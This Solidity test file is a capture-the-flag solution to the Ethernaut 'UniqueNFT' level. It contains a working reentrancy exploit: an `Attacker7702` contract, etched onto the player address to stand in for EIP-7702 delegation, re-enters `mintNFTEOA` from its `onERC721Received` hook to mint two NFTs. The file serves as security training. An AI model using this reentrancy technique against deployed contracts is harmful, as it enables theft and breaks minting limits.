// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {UniqueNFT} from "../src/levels/UniqueNFT.sol";

/// Ethernaut "UniqueNFT" → CEI-violation reentrancy enabled by an EIP-7702-delegated EOA.
/// (catalog: `cei-reentrancy`, with a 7702 angle.)
///
/// `_mintNFT` checks `balanceOf(msg.sender) == 0`, then calls `ERC721Utils.checkOnERC721Received`
/// (which invokes `msg.sender.onERC721Received` *if it has code*) BEFORE `_mint`. `mintNFTEOA`
/// guards only with `tx.origin == msg.sender` and is NOT `nonReentrant`. So if the player EOA has
/// code, its receiver hook can re-enter `mintNFTEOA` while balance is still 0 → two mints.
///
/// The level intends **EIP-7702** (delegate the EOA to attacker code). The suite is pinned to the
/// `paris` EVM (older levels rely on pre-6780 SELFDESTRUCT), and 7702 cheatcodes need `prague`, so
/// we model the *outcome of* the delegation — "the player EOA now has code" — with `vm.etch`, which
/// is exactly the precondition the exploit needs. `tx.origin == msg.sender` still holds because the
/// player is the (pranked) caller and originator. Win: `balanceOf(player) > 1`.
contract UniqueNFTTest is Test {
    UniqueNFT instance;
    address player;

    function setUp() public {
        instance = new UniqueNFT();
        player = makeAddr("player");
    }

    function test_solve_unique_nft() public {
        // Deploy the attacker, then "delegate" the player EOA to its code (models 7702).
        Attacker7702 impl = new Attacker7702(instance);
        vm.etch(player, address(impl).code); // player EOA now has the attacker's runtime code

        // Player calls mintNFTEOA as both caller and tx originator (tx.origin == msg.sender).
        vm.prank(player, player);
        instance.mintNFTEOA();

        // Reentrancy minted twice while balance was still 0.
        assertEq(instance.balanceOf(player), 2, "two NFTs minted to one 'EOA'");
        assertGt(instance.balanceOf(player), 1, "win: validateInstance balanceOf(player) > 1");
    }
}

/// Player-EOA delegate: its `onERC721Received` re-enters `mintNFTEOA` exactly once, during the
/// window where the outer mint hasn't updated balance yet. `nft` is immutable (lives in code, so it
/// survives the `vm.etch` delegation); `reentered` is a one-shot storage flag.
contract Attacker7702 {
    UniqueNFT immutable nft;
    bool reentered;

    constructor(UniqueNFT _nft) {
        nft = _nft;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (!reentered) {
            reentered = true;
            nft.mintNFTEOA();
        }
        return this.onERC721Received.selector;
    }
}
